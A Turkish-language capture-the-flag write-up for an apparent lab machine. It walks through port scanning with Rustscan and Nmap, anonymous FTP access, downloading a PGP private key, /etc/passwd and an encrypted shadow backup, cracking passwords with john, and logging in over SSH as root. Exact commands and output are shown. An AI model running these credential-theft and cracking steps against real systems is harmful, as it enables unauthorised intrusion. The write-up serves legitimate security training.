İlk olarak, hedef sistemde açık portları tespit edebilmek için Rustscan ile hızlı bir tarama gerçekleştiriyoruz.
Rustscan’i tercih etmemin nedeni, Nmap’e kıyasla çok daha hızlı sonuç vermesi. Ancak Rustscan, yalnızca portları hızlı bir şekilde tespit eder; hizmet versiyonu veya derin analiz yapmaz. Bu nedenle, Rustscan çıktısında elde ettiğimiz port bilgilerini, daha detaylı analiz yapabilmek amacıyla Nmap'e aktarıyoruz.

```bash
rustscan -a 10.10.42.172 
```

```bash

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit
Open 10.10.42.172:21
Open 10.10.42.172:22
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 09:01 EDT
Initiating Ping Scan at 09:01
Scanning 10.10.42.172 [4 ports]
Completed Ping Scan at 09:01, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:01
Completed Parallel DNS resolution of 1 host. at 09:01, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 09:01
Scanning 10.10.42.172 [2 ports]
Discovered open port 22/tcp on 10.10.42.172
Discovered open port 21/tcp on 10.10.42.172
Completed SYN Stealth Scan at 09:01, 0.11s elapsed (2 total ports)
Nmap scan report for 10.10.42.172
Host is up, received echo-reply ttl 63 (0.087s latency).
Scanned at 2025-07-29 09:01:22 EDT for 1s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
           Raw packets sent: 6 (240B) | Rcvd: 7 (724B)
```

---

Rustscan taramasının ardından 21 ve 22 numaralı portların açık olduğunu tespit ettik.
Bu portlara ilişkin daha detaylı bilgi edinmek amacıyla, yalnızca bu iki portu hedef alan özel bir Nmap taraması gerçekleştirdik. Böylece, açık olan servislerin versiyon bilgilerini ve olası zafiyetleri analiz etmeyi hedefledik.

```bash
nmap -Pn -sV -A -p 21,22 10.10.42.172      
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 09:01 EDT
WARNING: RST from 10.10.42.172 port 21 -- is this port really open?
Nmap scan report for 10.10.42.172
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Jul 29 05:57 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x   95 0        0               0 Jul 29 05:56 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Jul 29 05:57 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Jul 29 05:56 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.233.156
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 (96%), Linux 3.2 - 4.14 (96%), Linux 3.10 - 3.13 (95%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.10 (94%), Linux 4.4 (93%), Linux 3.7 - 4.19 (92%), Synology DiskStation Manager 5.2-5644 (92%), Linux 3.11 - 3.14 (92%), Ruckus ZoneFlex R710 WAP (Linux 3.4) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   100.80 ms 10.21.0.1
2   102.59 ms 10.10.42.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.64 seconds
```
---

Nmap taramasından elde ettiğimiz çıktıya göre, 21 numaralı port üzerinde çalışan FTP servisine "anonymous" kullanıcı ile giriş yapılabildiğini gördük.
Bu yetkiyi kullanarak FTP servisine bağlandık ve içerideki dizinleri inceledik. Yapılan inceleme sonucunda, FTP dizininde yer alan user.txt dosyasına ulaştık ve bu dosyayı indirerek ilk kullanıcı bayrağını (flag) başarıyla elde ettik.

```bash
ftp 10.10.42.172
```
```bash

Connected to 10.10.42.172.
220 (vsFTPd 3.0.3)
Name (10.10.42.172:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /home
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||36338|)
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||20483|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> more user.txt
6060xxxxxxxxxxxxxxxxxxxxxxxxxxxx
ftp> 
```

---

FTP servisinde gezinmeye devam ederken, notread adında bir dizin (klasör) olduğunu fark ettik.
Bu klasör, ismi ve boyutu itibariyle dikkat çekiciydi ve içeriğinde yetkisiz erişim kısıtlaması olabileceğini düşündürdü. Bu nedenle klasörü detaylıca incelemeye karar verdik.

```bash
ftp> ls
229 Entering Extended Passive Mode (|||53491|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Jul 29 05:57 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   84 0        0               0 Jul 29 05:56 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             560 Jul 29 06:25 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Jul 29 05:56 sys
drwxrwxrwt    9 0        0            4096 Jul 29 06:25 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp> 
```

---

notread klasörünün içeriğini kontrol ettiğimizde içerisinde iki adet dosya bulunduğunu gördük.
Bu dosyaların içeriklerini daha rahat analiz edebilmek için her ikisini de kendi lokal sistemimize indirdik.

```bash
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||53490|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> get backup.pgp
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||63846|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |***********************************************************************|   524        1.13 MiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (5.95 KiB/s)
ftp> get private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||34931|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |***********************************************************************|  3762        3.66 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (39.91 KiB/s)
ftp> 

```
---

Arşivden elde ettiğimiz dosyalardan biri private.asc adlı bir PGP özel anahtarıydı.
Bu anahtarı kullanabilmek için önce john aracıyla kırılabilir hale getirmek amacıyla uygun formata dönüştürdük. Ardından parola kırma işlemini gerçekleştirdik ve başarılı bir şekilde anahtarın şifresini çözdük.
Elde ettiğimiz şifre sayesinde, elimizdeki şifreli .gpg dosyasını başarıyla açmayı başardık.

<img width="1803" height="901" alt="root" src="https://github.com/user-attachments/assets/f4a619e0-22ef-486b-a35d-7dd79c8bdea0" />

---

Şifreli .gpg dosyasını açtıktan sonra, içerisinde sistemin shadow dosyasının yer aldığını fark ettik ve bu dosyayı kaydettik.
Ayrıca, FTP servisi üzerinden /etc/passwd dosyasına da erişebildiğimizi gördük ve bu dosyayı da lokal sistemimize indirerek parola kırma işlemleri için gerekli tüm verileri toplamış olduk.

```bash
ftp> cd /etc
250 Directory successfully changed.
ftp> get passwd
local: passwd remote: passwd
229 Entering Extended Passive Mode (|||43658|)
150 Opening BINARY mode data connection for passwd (1524 bytes).
100% |***********************************************************************|  1524       16.14 MiB/s    00:00 ETA
226 Transfer complete.
1524 bytes received in 00:00 (16.79 KiB/s)
ftp> 
```

---

Ardından, aşağıdaki komutu kullanarak passwd ve shadow dosyalarını birleştirip, john aracının anlayabileceği uygun formata dönüştürdük:
```bash
unshadow passwd shadow > kir.txt
```
Bu şekilde oluşturduğumuz hash.txt dosyasını john ile parola kırma işlemine hazır hale getirdik.

---

Hazırladığımız kir.txt dosyasını john aracına vererek parola kırma işlemini başlattık.
john, sistemdeki kullanıcıya ait parola hash’ini analiz ederek kısa süre içinde şifreyi başarılı bir şekilde kırdı.


```bash
john kir.txt
```

<img width="710" height="209" alt="ssh" src="https://github.com/user-attachments/assets/b3764d1b-ae78-4d2e-afe3-d454dbd4ca67" />

---

John ile şifreyi kırdıktan sonra, elde ettiğimiz kimlik bilgileriyle SSH servisine root kullanıcısı olarak bağlandık ve sistemdeki root bayrağını başarıyla ele geçirdik.


```bash
ssh root@10.10.42.172
root@10.10.42.172's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Tue Jul 29 06:44:56 2025 from 10.21.233.156
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt 
f706xxxxxxxxxxxxxxxxxxxxxxxxxxx
root@ubuntu:~# 
```

---

Bu Ctf bana ne öğretti?

Sonuç olarak, bu CTF süreci bana gerçek dünyadaki güvenlik açıklarını tespit etme, çeşitli araçları etkin şekilde kullanma ve sistemlerdeki zafiyetleri analiz ederek nasıl erişim sağlanacağını deneyimleme fırsatı sundu. Öğrendiğim teknikler, hem temel ağ keşfi hem de ileri düzey şifre kırma yöntemleri açısından önemliydi. Bu sayede hem teorik bilgimi pratiğe dökme hem de problem çözme yeteneklerimi geliştirme şansı buldum.
